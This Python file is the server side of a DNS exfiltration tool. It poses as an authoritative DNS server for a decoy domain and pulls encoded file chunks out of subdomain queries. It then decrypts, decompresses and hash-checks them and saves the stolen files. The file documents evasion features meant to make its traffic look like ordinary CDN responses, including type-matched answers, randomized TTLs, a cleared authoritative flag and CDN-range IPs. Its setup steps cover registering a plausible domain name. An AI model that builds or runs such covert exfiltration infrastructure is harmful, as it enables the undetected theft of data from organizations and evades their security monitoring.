#!/usr/bin/env python3
"""DNS Exfiltration - Authoritative DNS Server (Receiver)

Runs as an authoritative DNS server for the exfiltration domain(s).
Extracts encoded data from incoming DNS subdomain queries,
responds with valid DNS answers matching the query type, and
reassembles the exfiltrated file.

Anti-detection in responses:
- Matches response type to query type (A->IP, AAAA->IPv6, CNAME->domain)
- Randomized TTL per response (60-3600s, realistic CDN range)
- No authoritative flag (aa=0) to blend with cached responses
- Realistic response IPs from CDN ranges

Setup:
    1. Register domain(s) (e.g., analytics-cdn.example.com)
    2. Set NS records to point to this server's IP
    3. Run: sudo python3 dns_server.py

Query format:
    <data_labels>.<session_id>.<base_domain>
    Metadata:  m<data_labels>.<session_id>.<base_domain>
    Rotation:  <old_id_labels>.r<new_id>.<base_domain>
"""

import gzip
import hashlib
import os
import random
import sys
import time

from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, UDP,
    sniff, send,
)

from config import (
    BASE_DOMAINS,
    DNS_PORT,
    ENCODING_STRATEGY,
    HASH_ALGORITHM,
    METADATA_PREFIX,
    OUTPUT_DIR,
    RESPONSE_IP_POOL,
    RESPONSE_TTL_RANGE,
    SESSION_KEY_LENGTH,
)
from crypto import decrypt
from encoding import decode_hex_split, decode_wordlist, extract_sequence


class Session:
    """Tracks an active file transfer session."""

    def __init__(self, session_id, session_key=None):
        self.session_id = session_id
        self.session_key = session_key
        self.chunk_count = None
        self.original_hash = None
        self.compressed = False
        self.encrypted = False
        self.chunks = {}
        self.created_at = time.time()
        self.linked_from = None  # previous session ID if rotated

    def is_complete(self):
        if self.chunk_count is None:
            return False
        return len(self.chunks) >= self.chunk_count

    def reassemble(self):
        """Reassemble chunks in sequence order."""
        if not self.is_complete():
            return None

        data = b""
        for seq in range(1, self.chunk_count + 1):
            if seq in self.chunks:
                data += self.chunks[seq]
            else:
                print(f"  Missing chunk seq {seq}")
                return None
        return data


class DNSExfilServer:
    """Authoritative DNS server that extracts exfiltrated data."""

    def __init__(self):
        self.sessions = {}
        self.session_chains = {}  # maps new_id -> old_id for linking
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self._default_session_key = None

    def set_session_key(self, key_hex):
        """Set the shared session key (hex string)."""
        self._default_session_key = bytes.fromhex(key_hex)

    def decode_labels(self, labels):
        """Decode data labels using the configured strategy."""
        if ENCODING_STRATEGY == "hex_split":
            return decode_hex_split(labels)
        elif ENCODING_STRATEGY == "wordlist":
            return decode_wordlist(labels)
        else:
            raise ValueError(f"Unknown encoding strategy: {ENCODING_STRATEGY}")

    def _is_our_domain(self, qname):
        """Check if query is for any of our domains."""
        qname_clean = qname.rstrip(".")
        for domain in BASE_DOMAINS:
            if qname_clean.endswith(domain):
                return domain
        return None

    def parse_query(self, qname):
        """Parse a DNS query name into components.

        Format: <data_labels>.<session_id>.<base_domain>

        Returns: (data_labels, session_id, base_domain, is_metadata, is_rotation)
        """
        if qname.endswith("."):
            qname = qname[:-1]

        matched_domain = self._is_our_domain(qname)
        if not matched_domain:
            return None

        prefix = qname[:-(len(matched_domain) + 1)]
        parts = prefix.split(".")

        if len(parts) < 2:
            return None

        # Last part = session ID (may start with 'r' for rotation)
        session_id = parts[-1]
        data_labels = parts[:-1]

        # Check for rotation announcement
        is_rotation = session_id.startswith("r")
        if is_rotation:
            session_id = session_id[1:]  # strip 'r' prefix

        # Check for metadata
        is_metadata = False
        if data_labels and data_labels[0].startswith(METADATA_PREFIX):
            is_metadata = True
            data_labels[0] = data_labels[0][len(METADATA_PREFIX):]

        return data_labels, session_id, matched_domain, is_metadata, is_rotation

    def build_response(self, pkt):
        """Build a valid DNS response matching the query type."""
        qname = pkt[DNSQR].qname
        qtype = pkt[DNSQR].qtype
        txid = pkt[DNS].id

        src_ip = pkt[IP].src
        src_port = pkt[UDP].sport
        dst_ip = pkt[IP].dst

        ttl = random.randint(*RESPONSE_TTL_RANGE)

        if qtype == 28:  # AAAA
            pool = RESPONSE_IP_POOL.get("AAAA", ["2606:4700::1"])
            rdata = random.choice(pool)
            rr_type = "AAAA"
        elif qtype == 5:  # CNAME
            pool = RESPONSE_IP_POOL.get("CNAME", ["cdn.example.net."])
            rdata = random.choice(pool)
            rr_type = "CNAME"
        else:  # A (type 1) and fallback
            pool = RESPONSE_IP_POOL.get("A", ["104.16.132.229"])
            rdata = random.choice(pool)
            rr_type = "A"

        response = (
            IP(src=dst_ip, dst=src_ip)
            / UDP(sport=DNS_PORT, dport=src_port)
            / DNS(
                id=txid,
                qr=1,       # response
                aa=0,        # NOT authoritative (blend with cached)
                rd=1,        # recursion desired (mimic recursive response)
                ra=1,        # recursion available
                rcode=0,     # no error
                qd=DNSQR(qname=qname, qtype=qtype),
                an=DNSRR(
                    rrname=qname,
                    type=rr_type,
                    rdata=rdata,
                    ttl=ttl,
                ),
            )
        )
        return response

    def _get_root_session(self, session_id):
        """Follow session chain to find the root session with all chunks."""
        visited = set()
        current = session_id
        while current in self.session_chains and current not in visited:
            visited.add(current)
            current = self.session_chains[current]
        return current

    def handle_rotation(self, data_labels, new_session_id):
        """Process a session rotation announcement."""
        try:
            raw = self.decode_labels(data_labels)
            old_session_id = raw.decode()

            self.session_chains[new_session_id] = old_session_id

            root_id = self._get_root_session(new_session_id)
            if root_id in self.sessions:
                print(f"  Session rotation: {old_session_id} -> {new_session_id}")
                if new_session_id not in self.sessions:
                    self.sessions[new_session_id] = self.sessions[root_id]
            else:
                print(f"  Rotation announced but root session {root_id} not found yet")

        except Exception as e:
            print(f"  Rotation decode error: {e}")

    def handle_metadata(self, session, data_labels):
        """Process a metadata query containing chunk count, hash, and flags."""
        try:
            raw = self.decode_labels(data_labels)

            if self._default_session_key:
                _, raw_data = extract_sequence(raw, self._default_session_key)
                text = raw_data.decode()
            else:
                text = raw.decode()

            parts = text.split("||")
            if len(parts) >= 2:
                session.chunk_count = int(parts[0])
                session.original_hash = parts[1]
                if len(parts) >= 3:
                    session.compressed = parts[2] == "1"
                if len(parts) >= 4:
                    session.encrypted = parts[3] == "1"
                print(f"  Metadata: {session.chunk_count} chunks, "
                      f"hash={session.original_hash[:16]}..., "
                      f"compressed={session.compressed}, "
                      f"encrypted={session.encrypted}")
            else:
                print(f"  Invalid metadata format: {text}")
        except Exception as e:
            print(f"  Metadata decode error: {e}")

    def handle_data(self, session, data_labels):
        """Process a data query containing a file chunk with embedded sequence."""
        try:
            raw = self.decode_labels(data_labels)

            if self._default_session_key:
                seq_num, chunk_data = extract_sequence(raw, self._default_session_key)
            else:
                seq_num = int.from_bytes(raw[:2], "big")
                chunk_data = raw[2:]

            if seq_num not in session.chunks:
                session.chunks[seq_num] = chunk_data
        except Exception as e:
            print(f"  Data decode error: {e}")

    def check_completion(self, session):
        """Check if session is complete and save file if so."""
        if not session.is_complete():
            received = len(session.chunks)
            total = session.chunk_count or "?"
            if received % 10 == 0 or received == total:
                print(f"  Progress: {received}/{total} chunks")
            return

        print(f"  All {session.chunk_count} chunks received. Reassembling...")
        data = session.reassemble()

        if data is None:
            print("  Reassembly failed - missing chunks.")
            return

        # Decrypt if needed
        if session.encrypted and self._default_session_key:
            try:
                data = decrypt(data, self._default_session_key)
                print(f"  Decrypted: {len(data)} bytes")
            except Exception as e:
                print(f"  Decryption failed: {e}")
                return

        # Decompress if needed
        if session.compressed:
            try:
                data = gzip.decompress(data)
                print(f"  Decompressed: {len(data)} bytes")
            except Exception as e:
                print(f"  Decompression failed: {e}")
                return

        # Verify hash
        hasher = hashlib.new(HASH_ALGORITHM)
        hasher.update(data)
        received_hash = hasher.hexdigest()

        if received_hash == session.original_hash:
            filename = os.path.join(
                OUTPUT_DIR,
                f"exfil_{session.session_id}_{int(time.time())}"
            )
            with open(filename, "wb") as f:
                f.write(data)
            print(f"  HASH VERIFIED - File saved: {filename} ({len(data)} bytes)")
        else:
            print(f"  HASH MISMATCH!")
            print(f"    Expected: {session.original_hash}")
            print(f"    Got:      {received_hash}")

        # Clean up session
        if session.session_id in self.sessions:
            del self.sessions[session.session_id]

    def process_packet(self, pkt):
        """Process an incoming DNS query packet."""
        if not pkt.haslayer(DNSQR):
            return

        qname = pkt[DNSQR].qname.decode()

        if not self._is_our_domain(qname):
            return

        # Send valid DNS response (type-matched)
        response = self.build_response(pkt)
        send(response, verbose=False)

        # Parse query
        parsed = self.parse_query(qname)
        if parsed is None:
            return

        data_labels, session_id, base_domain, is_metadata, is_rotation = parsed

        # Handle session rotation announcements
        if is_rotation:
            self.handle_rotation(data_labels, session_id)
            return

        # Get or create session (follow chain to root)
        root_id = self._get_root_session(session_id)
        if root_id not in self.sessions:
            self.sessions[root_id] = Session(root_id)
            if session_id != root_id:
                self.sessions[session_id] = self.sessions[root_id]
            print(f"\n[+] New session: {root_id}")

        session = self.sessions[root_id]

        if is_metadata:
            self.handle_metadata(session, data_labels)
        else:
            self.handle_data(session, data_labels)

        self.check_completion(session)

    def run(self):
        """Start the DNS server."""
        print(f"DNS Exfiltration Server")
        print(f"  Domains: {', '.join(BASE_DOMAINS)}")
        print(f"  Port:    {DNS_PORT}")
        print(f"  Encoding: {ENCODING_STRATEGY}")
        print(f"  Output:   {OUTPUT_DIR}")
        if self._default_session_key:
            print(f"  Session key: {self._default_session_key.hex()}")
        print(f"  Listening...\n")

        bpf_filter = f"udp port {DNS_PORT}"

        try:
            sniff(
                filter=bpf_filter,
                prn=self.process_packet,
                store=False,
            )
        except KeyboardInterrupt:
            print("\nServer stopped.")


def main():
    if os.geteuid() != 0:
        print("Error: Root privileges required. Run with sudo.")
        sys.exit(1)

    server = DNSExfilServer()

    if len(sys.argv) > 1:
        server.set_session_key(sys.argv[1])
        print(f"Session key set: {sys.argv[1]}")

    server.run()


if __name__ == "__main__":
    main()
